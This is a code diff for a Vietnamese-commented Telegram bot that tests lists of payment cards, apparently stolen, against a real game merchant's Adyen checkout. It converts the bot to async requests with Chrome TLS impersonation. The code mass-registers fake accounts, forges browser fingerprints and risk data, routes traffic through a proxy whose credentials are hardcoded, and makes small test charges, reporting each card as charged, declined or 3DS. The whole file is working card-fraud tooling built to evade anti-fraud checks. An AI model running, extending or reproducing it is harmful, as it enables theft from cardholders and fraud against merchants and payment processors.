@@ -1,5 +1,4 @@
 import telebot
-import requests
 import re
 import os
 import json
@@ -7,16 +6,16 @@ import hmac
 import hashlib
 import base64
 import time
-from datetime import datetime
+import asyncio
 import random
 import string
+from datetime import datetime
 from fake_useragent import UserAgent
-import urllib3
 from colorama import Fore, init
+from curl_cffi.requests import AsyncSession
 
 # Khởi tạo colorama
 init(autoreset=True)
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ===================================================================
 # === CẤU HÌNH BOT TELEGRAM & PROXY
@@ -34,6 +33,7 @@ proxy_user = "88634867-zone-custom"
 proxy_pass = "AetOKcLB"
 proxy_url = f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"
 
+# Proxies config cho curl_cffi
 proxies = {
     "http": proxy_url,
     "https" : proxy_url
@@ -51,11 +51,11 @@ try:
     from Cryptodome.Util.Padding import pad
     from jose import jwk
 except ImportError:
-    print("Thiếu thư viện! Vui lòng chạy: pip install pycryptodomex python-jose requests pyTelegramBotAPI")
+    print("Thiếu thư viện! Vui lòng chạy: pip install pycryptodomex python-jose curl-cffi pyTelegramBotAPI")
     exit()
 
 # ===================================================================
-# === CÁC HÀM XỬ LÝ CHUỖI & VALIDATE (CẬP NHẬT THEO YÊU CẦU)
+# === CÁC HÀM XỬ LÝ CHUỖI & VALIDATE
 # ===================================================================
 
 def normalize_card(card_str):
@@ -77,7 +77,7 @@ def normalize_card(card_str):
     if len(year) == 2: year = '20' + year
     try:
         year_int = int(year)
-        if year_int > 2040: return None # Giới hạn năm cho hợp lý
+        if year_int > 2040: return None 
     except ValueError: return None
     
     month = month.zfill(2)
@@ -126,24 +126,13 @@ def get_short_brand_name(cc):
     else: return 'unknown'
 
 def generate_random_email():
-    names = [
-        "nguyenvan", "nguyenvana", "nguyenvanb", "minhquan", "minhtuan",
-        "anhtuan", "anhduc", "quanghuy", "hoangnam", "tienphat",
-        "thanhdat", "ducthanh", "quocbao", "phuocloc", "huyhoang",
-        "vanthanh", "truonggiang", "theanh", "namphong",
-        "ngocanh", "thuylinh", "quynhanh", "phuongthao", "kimngan",
-        "thuytien", "minhthu", "dieulinh", "lananh", "hoangyen",
-        "trangnguyen", "ngocbich", "maianh", "myhanh", "thanhtruc",
-        "phatphat", "namnam", "linhlinh", "anhyeu", "cuongpro",
-        "minhvip", "datcute", "huydz", "tuananh199", "vietnguyen",
-        "nguyenofficial"
-    ]
+    names = ["nguyenvan", "minhquan", "anhtuan", "quanghuy", "hoangnam", "thanhdat", "quocbao", "huyhoang", "vanthanh", "theanh", "ngocanh", "thuylinh", "kimngan", "minhthu", "lananh", "hoangyen", "myhanh", "cuongpro", "minhvip", "datcute", "huydz", "tuananh199"]
     name = random.choice(names)
-    random_str = ''.join(random.choices(string.digits, k=4))
+    random_str = ''.join(random.choices(string.digits, k=5))
     return f"{name}{random_str}@gmail.com"
 
 # ===================================================================
-# === PHẦN: THUẬT TOÁN MÃ HÓA ADYEN (GIỮ NGUYÊN)
+# === PHẦN: THUẬT TOÁN MÃ HÓA ADYEN (GIỮ NGUYÊN - SYNC)
 # ===================================================================
 
 def get_current_timestamp():
@@ -161,12 +150,7 @@ def generate_fake_log(length):
         events.append(f"KN@{base_time}")
     base_time += random.randint(200, 500)
     events.append(f"ch@{base_time}")
-    return {
-        "log": ",".join(events),
-        "key_count": str(length),
-        "click_count": "1",
-        "focus_count": "1"
-    }
+    return {"log": ",".join(events), "key_count": str(length), "click_count": "1", "focus_count": "1"}
 
 def w(e):
     t = e
@@ -264,166 +248,203 @@ def encrypt_card_data_480(card, month, year, cvc, adyen_key, stripe_key, domain)
         encrypted_details[key] = adyen_encryptor.encrypt_data(value)
     return encrypted_details
 
-def generate_dadus():
-    try:
-        user = UserAgent().random
-    except Exception:
-        user = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
-    json_string = f'{{"version":"1.0.0","deviceFingerprint":"1N39KVvVK8itaGr7odbrTKnBdbwt4n7PoYuk0009040344c{random.randint(100, 999)}iKzBGcrkpIQWp4A1B2M2Y8Asg0004erXqCOncs{random.randint(1000, 9909)}uFhJE00000WIL1VQ3oQKRWT1eb85Gu:40","persistentCookie":[],"components":{{"userAgent":"{user}","webdriver":0,"language":"vi-VN","colorDepth":24,"deviceMemory":8,"pixelRatio":1.25,"hardwareConcurrency":12,"screenWidth":2048,"screenHeight":1152,"availableScreenWidth":2048,"availableScreenHeight":1104,"timezoneOffset":-420,"timezone":"Asia/Bangkok","sessionStorage":1,"localStorage":1,"indexedDb":1,"addBehavior":0,"openDatabase":0,"platform":"Win32","plugins":"29cf71e3d81d74d43a5b0eb79405ba87","canvas":"a4375f9f6804450aa47496883e844553","webgl":"e05e860022c830166bcb93b7a3775148","webglVendorAndRenderer":"Google Inc. (NVIDIA)~ANGLE (NVIDIA, NVIDIA GeForce RTX 2060 (0x00001F08) Direct3D11 vs_5_0 ps_5_0, D3D11)","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":1,"hasLiedBrowser":0,"fonts":"41c37ee7a27152ed8fa4b3e6f2348b1b","audio":"902f0fe98719b779ea37f27528dfb0aa","enumerateDevices":"5f3fdaf4743eaa707ca6b7da65603892"}}}}'
+def generate_dadus(user_agent):
+    json_string = f'{{"version":"1.0.0","deviceFingerprint":"1N39KVvVK8itaGr7odbrTKnBdbwt4n7PoYuk0009040344c{random.randint(100, 999)}iKzBGcrkpIQWp4A1B2M2Y8Asg0004erXqCOncs{random.randint(1000, 9909)}uFhJE00000WIL1VQ3oQKRWT1eb85Gu:40","persistentCookie":[],"components":{{"userAgent":"{user_agent}","webdriver":0,"language":"vi-VN","colorDepth":24,"deviceMemory":8,"pixelRatio":1.25,"hardwareConcurrency":12,"screenWidth":2048,"screenHeight":1152,"availableScreenWidth":2048,"availableScreenHeight":1104,"timezoneOffset":-420,"timezone":"Asia/Bangkok","sessionStorage":1,"localStorage":1,"indexedDb":1,"addBehavior":0,"openDatabase":0,"platform":"Win32","plugins":"29cf71e3d81d74d43a5b0eb79405ba87","canvas":"a4375f9f6804450aa47496883e844553","webgl":"e05e860022c830166bcb93b7a3775148","webglVendorAndRenderer":"Google Inc. (NVIDIA)~ANGLE (NVIDIA, NVIDIA GeForce RTX 2060 (0x00001F08) Direct3D11 vs_5_0 ps_5_0, D3D11)","adBlock":0,"hasLiedLanguages":0,"hasLiedResolution":0,"hasLiedOs":1,"hasLiedBrowser":0,"fonts":"41c37ee7a27152ed8fa4b3e6f2348b1b","audio":"902f0fe98719b779ea37f27528dfb0aa","enumerateDevices":"5f3fdaf4743eaa707ca6b7da65603892"}}}}'
     return base64.b64encode(json_string.encode('utf-8')).decode('utf-8')
 
 # ===================================================================
-# === LOGIC XỬ LÝ CHÍNH
+# === ASYNC LOGIC XỬ LÝ (BIN & CHECKOUT)
 # ===================================================================
 
-def process_card_with_retries(cc, mm, yyyy, cvc, message_chat_id):
+async def get_bin_info(session, cc_num):
     """
-    Hàm xử lý logic retry:
-    - Retry vô hạn cho đăng ký.
-    - Retry 20 lần cho thanh toán (Network, 3DS, lỗi lạ).
+    Lấy thông tin BIN từ bins.antipublic.cc sử dụng session curl_cffi
     """
+    try:
+        bin_code = cc_num[:6]
+        url = f"https://bins.antipublic.cc/bins/{bin_code}"
+        # Dùng session hiện tại (có proxy) để gọi, timeout 5s để không bị delay
+        resp = await session.get(url, timeout=5)
+        
+        if resp.status_code == 200:
+            data = resp.json()
+            brand = data.get("brand", "N/A")
+            country_name = data.get("country_name", "N/A")
+            bank = data.get("bank", "N/A")
+            level = data.get("level", "N/A")
+            card_type = data.get("type", "N/A")
+            return f"{brand} - {country_name} - {bank} - {level} - {card_type}"
+        else:
+            return "BIN N/A"
+    except Exception:
+        return "BIN ERROR"
+
+async def process_card_async(cc, mm, yyyy, cvc, message_chat_id):
     MAX_RETRIES = 20
+    user_agent = UserAgent().random
     
-    for attempt in range(1, MAX_RETRIES + 1):
-        try:
-            # === BƯỚC 1: KHỞI TẠO SESSION & ĐĂNG KÝ (LOOP VÔ HẠN NẾU FAIL) ===
-            session = requests.Session()
-            session.proxies.update(proxies)
-            session.verify = False
-            
-            # Loop retry đăng ký
-            reg_success = False
-            current_email = ""
-            
-            while not reg_success:
-                try:
-                    # Lấy Token
-                    reg_headers = {
-                        'accept': '*/*', 'accept-language': 'vi-VN,vi;q=0.9',
-                        'referer': 'https://taongafarm.com/en/',
-                        'user-agent': UserAgent().random
-                    }
-                    resp_token = session.get('https://taongafarm.com/api/token.js', headers=reg_headers, timeout=15)
-                    match = re.search(r"window\.csrftoken='([^']+)'", resp_token.text) or re.search(r"window.csrftoken='([^']+)'", resp_token.text)
-                    
-                    if not match:
-                        continue # Retry loop đăng ký
-                    
-                    token = match.group(1)
-                    session.cookies.set('_csrf', token, domain='taongafarm.com')
-                    
-                    # Đăng ký
-                    current_email = generate_random_email()
-                    reg_headers.update({
-                        'accept': 'application/json, text/plain, */*', 'content-type': 'application/json',
-                        'x-csrf-token': token
-                    })
-                    reg_data = {
-                        'email': current_email, 'password': 'Minhnhat@@123',
-                        'register_info': {'device': {}, 'lang': 'en', 'nav': {'cookieEnabled': True, 'platform': 'Win32'}, 'ref': 'direct', 'url': '/en/'},
-                        'skip_email_validation': False, 'user_agree_terms': True
-                    }
-                    
-                    resp_reg = session.post('https://taongafarm.com/api/login/signup', headers=reg_headers, json=reg_data, timeout=15)
-                    
-                    # Check Cookie quan trọng
-                    if 'session_portal' in session.cookies.get_dict():
-                        reg_success = True
-                    else:
-                        pass # Retry loop đăng ký
-                        
-                except Exception:
-                    time.sleep(1)
-                    pass # Retry loop đăng ký
-
-            # === BƯỚC 2: MÃ HÓA & THANH TOÁN ===
-            encrypted_data = encrypt_card_data_480(cc, mm, yyyy, cvc, ADYEN_KEY, STRIPE_KEY, DOMAIN_URL)
-            
-            payment_headers = {
-                'accept': 'application/json, text/plain, */*',
-                'content-type': 'application/json',
-                'origin': 'https://taongafarm.com',
-                'referer': 'https://taongafarm.com/en/payment/adyen/checkout/',
-                'user-agent': session.headers.get('user-agent'),
-            }
-            
-            payment_json_data = {
-                'paymentRequest': {
-                    'riskData': {'clientData': generate_dadus()},
-                    'paymentMethod': {
-                        'type': 'scheme', 'holderName': '',
-                        'encryptedCardNumber': encrypted_data['encryptedCardNumber'],
-                        'encryptedExpiryMonth': encrypted_data['encryptedExpiryMonth'],
-                        'encryptedExpiryYear': encrypted_data['encryptedExpiryYear'],
-                        'encryptedSecurityCode': encrypted_data['encryptedSecurityCode'],
-                        'brand': get_short_brand_name(cc),
-                        'checkoutAttemptId': 'fetch-checkoutAttemptId-failed',
-                    },
-                    'storePaymentMethod': False,
-                    'browserInfo': {'acceptHeader': '*/*', 'colorDepth': 24, 'language': 'vi-VN', 'javaEnabled': False, 'screenHeight': 1152, 'screenWidth': 2048, 'userAgent': session.headers.get('user-agent'), 'timeZoneOffset': -420},
-                    'origin': 'https://taongafarm.com', 'clientStateDataIndicator': True,
-                },
-                'checkoutRequest': {
-                    'countryCodeFallback': 'GB', 'countryCodeOverride': '', 'email': current_email,
-                    'gameLanguage': 'en', 'gameLocale': 'en_US', 'offerId': 38334, 'platformId': '70345744830530987221',
-                    'platformType': 'portal', 'priceCurrency': 'USD', 'priceValue': 1.99, 'quantity': 1,
-                },
-                'browserInfo': {'acceptHeader': '*/*', 'screenWidth': 2048, 'screenHeight': 1152, 'colorDepth': 24, 'userAgent': session.headers.get('user-agent'), 'timeZoneOffset': -420, 'language': 'en-US', 'javaEnabled': False},
-                'billingInfo': {'countryCode': 'US', 'postalCode': '53227'},
-            }
-            
-            response = session.post(
-                'https://taongafarm.com/payment/adyen/api/checkout/payment',
-                headers=payment_headers, json=payment_json_data, timeout=20
-            )
-            
-            # === BƯỚC 3: PHÂN TÍCH KẾT QUẢ ===
+    # Sử dụng AsyncSession của curl_cffi để giả lập TLS (impersonate='chrome120')
+    async with AsyncSession(impersonate="chrome120", proxies=proxies, verify=False) as session:
+        
+        # Gọi hàm check BIN song song (Task) để không chặn luồng chính
+        bin_task = asyncio.create_task(get_bin_info(session, cc))
+        
+        # --- BƯỚC 1: LOOP ĐĂNG KÝ USER ---
+        reg_success = False
+        current_email = ""
+        
+        # Loop đăng ký (vô hạn cho đến khi được)
+        while not reg_success:
             try:
-                data = response.json()
-            except:
-                continue # JSON lỗi -> Retry
-
-            resultCode = data.get('resultCode', data.get('additionalData', {}).get('resultCode', 'N/A'))
-            cvcResultRaw = data.get('additionalData', {}).get('cvcResultRaw', 'N/A')
-            refusalReason = data.get('refusalReason', data.get('additionalData', {}).get('refusalReason', 'Refused'))
-
-            # Xử lý Retry cho 3DS
-            if resultCode in ["IdentifyShopper", "ChallengeShopper", "RedirectShopper"]:
-                if attempt < MAX_RETRIES:
-                    continue # Retry lại từ đầu (đăng ký user mới)
+                # Lấy Token
+                reg_headers = {
+                    'accept': '*/*', 'accept-language': 'vi-VN,vi;q=0.9',
+                    'referer': 'https://taongafarm.com/en/',
+                    'user-agent': user_agent
+                }
+                resp_token = await session.get('https://taongafarm.com/api/token.js', headers=reg_headers, timeout=15)
+                match = re.search(r"window\.csrftoken='([^']+)'", resp_token.text) or re.search(r"window.csrftoken='([^']+)'", resp_token.text)
+                
+                if not match:
+                    await asyncio.sleep(0.5)
+                    continue 
+                
+                token = match.group(1)
+                # curl_cffi tự quản cookie, nhưng set explicit nếu cần (thường session tự lưu)
+                # Nhưng logic cũ set cookie '_csrf', ta làm theo
+                session.cookies.set('_csrf', token, domain='taongafarm.com')
+                
+                # Register
+                current_email = generate_random_email()
+                reg_headers.update({
+                    'accept': 'application/json, text/plain, */*', 'content-type': 'application/json',
+                    'x-csrf-token': token
+                })
+                reg_data = {
+                    'email': current_email, 'password': 'Minhnhat@@123',
+                    'register_info': {'device': {}, 'lang': 'en', 'nav': {'cookieEnabled': True, 'platform': 'Win32'}, 'ref': 'direct', 'url': '/en/'},
+                    'skip_email_validation': False, 'user_agree_terms': True
+                }
+                
+                resp_reg = await session.post('https://taongafarm.com/api/login/signup', headers=reg_headers, json=reg_data, timeout=15)
+                
+                # Check cookie login
+                cookies_dict = session.cookies.get_dict()
+                if 'session_portal' in cookies_dict:
+                    reg_success = True
                 else:
-                    return f"⚠️ <b>3DS LIMIT</b> | {cc}|{mm}|{yyyy}|{cvc} | Code: {resultCode}"
-            
-            # Kết quả cuối cùng (Live hoặc Die)
-            if resultCode == "Authorised":
-                return f"✅ <b>CHARGED</b> | {cc}|{mm}|{yyyy}|{cvc} | [Auth] - 73.99 GBP"
-            elif resultCode == "Refused":
-                return f"❌ <b>DECLINED</b> | {cc}|{mm}|{yyyy}|{cvc} | [{cvcResultRaw}] | Reason: {refusalReason}"
-            else:
-                # Các lỗi khác (Error, Cancelled, etc.) -> có thể retry hoặc trả về luôn
-                if attempt < MAX_RETRIES:
-                    continue
-                return f"❌ <b>UNKNOWN</b> | {cc}|{mm}|{yyyy}|{cvc} | Code: {resultCode}"
+                    pass
+            except Exception:
+                await asyncio.sleep(0.5)
+                pass
 
-        except Exception as e:
-            # Lỗi request/mạng -> Retry
-            if attempt == MAX_RETRIES:
-                return f"❌ <b>ERROR</b> | {cc}|{mm}|{yyyy}|{cvc} | Msg: {str(e)}"
-            continue
+        # --- BƯỚC 2: THANH TOÁN (RETRY LOGIC) ---
+        for attempt in range(1, MAX_RETRIES + 1):
+            try:
+                # Mã hóa (CPU bound - chạy sync)
+                encrypted_data = encrypt_card_data_480(cc, mm, yyyy, cvc, ADYEN_KEY, STRIPE_KEY, DOMAIN_URL)
+                
+                payment_headers = {
+                    'accept': 'application/json, text/plain, */*',
+                    'content-type': 'application/json',
+                    'origin': 'https://taongafarm.com',
+                    'referer': 'https://taongafarm.com/en/payment/adyen/checkout/',
+                    'user-agent': user_agent,
+                }
+                
+                payment_json_data = {
+                    'paymentRequest': {
+                        'riskData': {'clientData': generate_dadus(user_agent)},
+                        'paymentMethod': {
+                            'type': 'scheme', 'holderName': '',
+                            'encryptedCardNumber': encrypted_data['encryptedCardNumber'],
+                            'encryptedExpiryMonth': encrypted_data['encryptedExpiryMonth'],
+                            'encryptedExpiryYear': encrypted_data['encryptedExpiryYear'],
+                            'encryptedSecurityCode': encrypted_data['encryptedSecurityCode'],
+                            'brand': get_short_brand_name(cc),
+                            'checkoutAttemptId': 'fetch-checkoutAttemptId-failed',
+                        },
+                        'storePaymentMethod': False,
+                        'browserInfo': {'acceptHeader': '*/*', 'colorDepth': 24, 'language': 'vi-VN', 'javaEnabled': False, 'screenHeight': 1152, 'screenWidth': 2048, 'userAgent': user_agent, 'timeZoneOffset': -420},
+                        'origin': 'https://taongafarm.com', 'clientStateDataIndicator': True,
+                    },
+                    'checkoutRequest': {
+                        'countryCodeFallback': 'GB', 'countryCodeOverride': '', 'email': current_email,
+                        'gameLanguage': 'en', 'gameLocale': 'en_US', 'offerId': 38334, 'platformId': '70345744830530987221',
+                        'platformType': 'portal', 'priceCurrency': 'USD', 'priceValue': 1.99, 'quantity': 1,
+                    },
+                    'browserInfo': {'acceptHeader': '*/*', 'screenWidth': 2048, 'screenHeight': 1152, 'colorDepth': 24, 'userAgent': user_agent, 'timeZoneOffset': -420, 'language': 'en-US', 'javaEnabled': False},
+                    'billingInfo': {'countryCode': 'US', 'postalCode': '53227'},
+                }
+                
+                response = await session.post(
+                    'https://taongafarm.com/payment/adyen/api/checkout/payment',
+                    headers=payment_headers, json=payment_json_data, timeout=20
+                )
+                
+                try:
+                    data = response.json()
+                except:
+                    continue # JSON Error -> Retry
 
-    return f"❌ <b>TIMEOUT</b> | {cc}|{mm}|{yyyy}|{cvc} | Retried {MAX_RETRIES} times"
+                # Lấy các trường kết quả
+                additionalData = data.get('additionalData', {})
+                resultCode = data.get('resultCode', additionalData.get('resultCode', 'N/A'))
+                refusalReason = data.get('refusalReason', additionalData.get('refusalReason', 'N/A'))
+                
+                cvcResultRaw = additionalData.get('cvcResultRaw', 'N/A')
+                cvcResult = additionalData.get('cvcResult', 'N/A')
+                avsResultRaw = additionalData.get('avsResultRaw', 'N/A')
+                avsResult = additionalData.get('avsResult', 'N/A')
+                refusalReasonRaw = additionalData.get('refusalReasonRaw', 'N/A')
+
+                # Đợi lấy bin info
+                bin_info_str = await bin_task
+
+                # Xử lý kết quả 3DS -> Retry (logic cũ)
+                if resultCode in ["IdentifyShopper", "ChallengeShopper", "RedirectShopper"]:
+                    if attempt < MAX_RETRIES:
+                        continue # Retry lại (Lưu ý: Logic cũ retry cả loop đăng ký, ở đây ta retry payment request hoặc có thể break để return 3DS)
+                    else:
+                        msg = "3DS LIMIT"
+                        result_str = f"{cc}|{mm}|{yyyy}|{cvc}|{cvcResultRaw}|{cvcResult}|{avsResultRaw}|{avsResult}|{resultCode}|{refusalReasonRaw}|{msg} - [{bin_info_str}]"
+                        return f"⚠️ <b>3DS LIMIT</b> | {result_str}"
+                
+                # Kết quả Live/Die
+                if resultCode == "Authorised":
+                    msg = "CHARGED 1.99$"
+                    result_str = f"{cc}|{mm}|{yyyy}|{cvc}|{cvcResultRaw}|{cvcResult}|{avsResultRaw}|{avsResult}|{resultCode}|{refusalReasonRaw}|{msg} - [{bin_info_str}]"
+                    return f"✅ <b>CHARGED</b> | {result_str}"
+                
+                elif resultCode == "Refused":
+                    msg = f"Refused: {refusalReason}"
+                    result_str = f"{cc}|{mm}|{yyyy}|{cvc}|{cvcResultRaw}|{cvcResult}|{avsResultRaw}|{avsResult}|{resultCode}|{refusalReasonRaw}|{msg} - [{bin_info_str}]"
+                    return f"❌ <b>DECLINED</b> | {result_str}"
+                
+                else:
+                    if attempt < MAX_RETRIES: continue
+                    msg = f"Unknown: {resultCode}"
+                    result_str = f"{cc}|{mm}|{yyyy}|{cvc}|{cvcResultRaw}|{cvcResult}|{avsResultRaw}|{avsResult}|{resultCode}|{refusalReasonRaw}|{msg} - [{bin_info_str}]"
+                    return f"❌ <b>UNKNOWN</b> | {result_str}"
+
+            except Exception as e:
+                if attempt == MAX_RETRIES:
+                    bin_info_str = await bin_task # Đảm bảo await nếu lỗi
+                    return f"❌ <b>ERROR</b> | {cc}|{mm}|{yyyy}|{cvc} | {str(e)} - [{bin_info_str}]"
+                continue
+
+    bin_info_str = await bin_task
+    return f"❌ <b>TIMEOUT</b> | {cc}|{mm}|{yyyy}|{cvc} | Timeout after {MAX_RETRIES} tries - [{bin_info_str}]"
 
 # ===================================================================
-# === TELEGRAM BOT HANDLER
+# === TELEGRAM BOT HANDLER (SYNC WRAPPER -> ASYNC)
 # ===================================================================
 
 @bot.message_handler(commands=['st', 'start'])
 def handle_check_cards(message):
     raw_text = message.text.replace('/st', '').replace('/start', '').strip()
     
-    # Nếu user không nhập thẻ sau lệnh, nhắc user
     if not raw_text:
-        # Check xem có reply tin nhắn cũ không
         if message.reply_to_message and message.reply_to_message.text:
             raw_text = message.reply_to_message.text
         else:
@@ -436,33 +457,40 @@ def handle_check_cards(message):
         bot.reply_to(message, "⚠️ Không tìm thấy thẻ hợp lệ.")
         return
 
-    bot.reply_to(message, f"🚀 <b>Bắt đầu check {len(cards)} thẻ...</b>", parse_mode="HTML")
+    bot.reply_to(message, f"🚀 <b>Bắt đầu check {len(cards)} thẻ (Async Speed)...</b>", parse_mode="HTML")
 
-    for card in cards:
-        cc, mm, yyyy, cvc = card.split('|')
-        
-        # Check Luhn
-        if not validate_luhn(cc):
-            bot.send_message(message.chat.id, f"🗑 <b>INVALID LUHN</b> | {cc}", parse_mode="HTML")
-            continue
+    # Hàm chạy async loop trong thread sync của telebot
+    async def run_checks():
+        tasks = []
+        # Semaphore để giới hạn số luồng (tránh crash hoặc lỗi proxy quá tải)
+        sem = asyncio.Semaphore(5) # Check 5 thẻ cùng lúc
 
-        # Thông báo đang check (có thể bỏ dòng này nếu sợ spam)
-        msg_waiting = bot.send_message(message.chat.id, f"🔄 Checking: {cc[:6]}******{cc[-4:]}...", parse_mode="HTML")
+        async def worker(card):
+            async with sem:
+                cc, mm, yyyy, cvc = card.split('|')
+                if not validate_luhn(cc):
+                    bot.send_message(message.chat.id, f"🗑 <b>INVALID LUHN</b> | {cc}", parse_mode="HTML")
+                    return
+                
+                # Check
+                res = await process_card_async(cc, mm, yyyy, cvc, message.chat.id)
+                bot.send_message(message.chat.id, res, parse_mode="HTML")
+
+        for card in cards:
+            tasks.append(asyncio.create_task(worker(card)))
         
-        # Xử lý
-        result_text = process_card_with_retries(cc, mm, yyyy, cvc, message.chat.id)
-        
-        # Xóa tin nhắn chờ và gửi kết quả
-        try:
-            bot.delete_message(message.chat.id, msg_waiting.message_id)
-        except:
-            pass
-        
-        bot.send_message(message.chat.id, result_text, parse_mode="HTML")
+        await asyncio.gather(*tasks)
+
+    # Chạy asyncio loop
+    try:
+        asyncio.run(run_checks())
+        bot.send_message(message.chat.id, "🏁 <b>Hoàn tất checking!</b>", parse_mode="HTML")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"⚠️ Lỗi hệ thống: {str(e)}")
 
 # Chạy bot
 if __name__ == "__main__":
-    print("Bot is running...")
+    print("Bot is running with Curl_CFFI Async...")
     while True:
         try:
             bot.polling(none_stop=True)
